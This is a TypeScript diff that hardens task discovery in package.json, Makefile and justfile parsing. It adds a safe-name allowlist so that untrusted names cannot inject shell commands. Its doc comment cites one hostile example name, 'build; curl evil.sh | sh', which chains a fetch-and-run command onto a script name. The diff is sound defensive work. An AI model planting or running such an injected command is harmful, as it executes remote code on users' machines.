@@ -5,6 +5,22 @@ import { parseJsonc } from '../model/jsonc';
 
 export type PackageManager = 'npm' | 'pnpm' | 'yarn' | 'bun';
 
+/**
+ * Characters a discovered name may contain and still be safe to drop into a command line
+ * unquoted.
+ *
+ * Discovery reads names out of files that belong to whatever repository happens to be open, so
+ * they are untrusted input. A `package.json` can legally declare a script called
+ * `build; curl evil.sh | sh`, and the resulting command would be sent to a terminal as one line.
+ * Names that cannot be represented safely are skipped rather than escaped: a task nobody can name
+ * sanely is not worth running, and quoting rules differ per shell.
+ */
+const SAFE_TASK_NAME = /^[A-Za-z0-9._:@/+-]+$/;
+
+export function isSafeTaskName(name: string): boolean {
+  return name.length > 0 && name.length <= 128 && SAFE_TASK_NAME.test(name);
+}
+
 export interface DiscoveredTask {
   /** Stable within its source, e.g. the script or target name. */
   name: string;
@@ -55,7 +71,7 @@ export function parsePackageScripts(
   if (!scripts || typeof scripts !== 'object') return [];
   const tasks: DiscoveredTask[] = [];
   for (const [name, value] of Object.entries(scripts)) {
-    if (typeof value !== 'string' || name.length === 0) continue;
+    if (typeof value !== 'string' || !isSafeTaskName(name)) continue;
     tasks.push({ name, command: runScriptCommand(manager, name), detail: value });
   }
   return tasks;
@@ -77,6 +93,7 @@ export function parseMakefileTargets(text: string): DiscoveredTask[] {
       if (name.length === 0) continue;
       if (name.startsWith('.')) continue; // .PHONY, .DEFAULT_GOAL, …
       if (name.includes('%') || name.includes('$')) continue; // pattern and generated rules
+      if (!isSafeTaskName(name)) continue; // untrusted file; see SAFE_TASK_NAME
       if (seen.has(name)) continue;
       seen.add(name);
       tasks.push({ name, command: `make ${name}` });
@@ -101,6 +118,7 @@ export function parseJustfileRecipes(text: string): DiscoveredTask[] {
     const match = JUST_RECIPE.exec(line);
     if (!match) continue;
     const name = match[1]!;
+    if (!isSafeTaskName(name)) continue;
     if (seen.has(name)) continue;
     seen.add(name);
     const parameters = match[2]!.trim();
